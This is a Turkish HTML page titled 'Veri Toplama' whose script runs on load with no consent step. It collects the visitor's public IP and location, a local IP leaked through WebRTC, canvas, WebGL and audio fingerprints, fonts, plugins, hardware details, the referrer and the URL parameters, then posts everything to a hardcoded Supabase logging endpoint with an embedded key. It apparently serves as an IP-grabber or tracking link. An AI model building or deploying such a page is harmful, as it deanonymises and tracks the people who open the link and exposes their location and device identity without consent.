<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Veri Toplama</title>
    <script>
        const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
        const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";

        async function getLocalIP() {
            return new Promise((resolve) => {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    let localIP = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
                    if (localIP) resolve(localIP);
                    pc.close();
                };
                setTimeout(() => resolve("Alınamadı"), 2000);
            });
        }

        function getCanvasFingerprint() {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.fillStyle = "#f60";
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#fff";
            ctx.font = "14px Arial";
            ctx.fillText("Fingerprint", 10, 30);
            return canvas.toDataURL();
        }

        function getWebGLFingerprint() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                if (!gl) return "WebGL desteklenmiyor";
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
                return "Bilinmiyor";
            } catch(e) {
                return "Hata";
            }
        }

        async function getAudioFingerprint() {
            try {
                let AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return "AudioContext yok";
                let ctx = new AudioContext();
                let oscillator = ctx.createOscillator();
                let analyser = ctx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(ctx.destination);
                oscillator.start(0);
                let data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                oscillator.stop();
                await ctx.close();
                return Array.from(data.slice(0, 10)).join(',');
            } catch(e) {
                return "Hata";
            }
        }

        async function getFonts() {
            if (!document.fonts) return "Font API yok";
            let fonts = await document.fonts.ready;
            let fontList = [];
            for (let font of fonts) {
                fontList.push(font.family);
                if (fontList.length > 20) break;
            }
            return fontList.join(', ');
        }

        function getPlugins() {
            let plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins.join(', ') || "Eklenti yok";
        }

        function getDeviceName() {
            let ua = navigator.userAgent;
            if (/iPhone/.test(ua)) return "iPhone";
            if (/iPad/.test(ua)) return "iPad";
            if (/Android/.test(ua)) return "Android";
            if (/Windows/.test(ua)) return "Windows PC";
            if (/Mac/.test(ua)) return "Mac";
            if (/Linux/.test(ua)) return "Linux";
            return "Bilinmiyor";
        }

        async function sendData() {
            try {
                let ipRes = await fetch("https://ipapi.co/json/");
                let ipData = await ipRes.json();

                let localIP = await getLocalIP();
                let canvasFP = getCanvasFingerprint();
                let webglFP = getWebGLFingerprint();
                let audioFP = await getAudioFingerprint();
                let fonts = await getFonts();
                let plugins = getPlugins();
                let deviceName = getDeviceName();

                let payload = {
                    ip: ipData.ip,
                    ulke: ipData.country_name,
                    sehir: ipData.city,
                    bolge: ipData.region,
                    isp: ipData.org,
                    vpn_proxy: ipData.proxy || false,
                    hosting: ipData.hosting || false,
                    tor: ipData.tor || false,
                    local_ip: localIP,
                    cihaz_adi: deviceName,
                    tarayici: navigator.userAgent.split(' ')[0],
                    isletim_sistemi: navigator.platform,
                    ekran_cozunurluk: `${screen.width}x${screen.height}`,
                    dil: navigator.language,
                    saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookie_enabled: navigator.cookieEnabled,
                    device_pixel_ratio: window.devicePixelRatio,
                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
                    cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
                    gpu: webglFP,
                    webgl_fingerprint: webglFP,
                    canvas_fingerprint: canvasFP.substring(0, 200),
                    audio_fingerprint: audioFP,
                    yuklu_fontlar: fonts.substring(0, 300),
                    eklentiler: plugins.substring(0, 300),
                    user_agent: navigator.userAgent,
                    referer: document.referrer,
                    url_parametreleri: window.location.search.substring(1)
                };

                await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                document.body.innerHTML = "<h2 style='color:green; text-align:center; margin-top:50px;'>Bilgileriniz kaydedildi.</h2>";
            } catch(e) {
                document.body.innerHTML = "<h2 style='color:red; text-align:center; margin-top:50px;'>Veri gönderilemedi.</h2>";
                console.error(e);
            }
        }

        window.onload = sendData;
    </script>
</head>
<body style="background:#000; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace;">
    <div style="text-align:center;">
        <div class="spinner" style="width:40px;height:40px;border:3px solid #0f0;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
        <p>Bilgileriniz toplanıyor...</p>
    </div>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
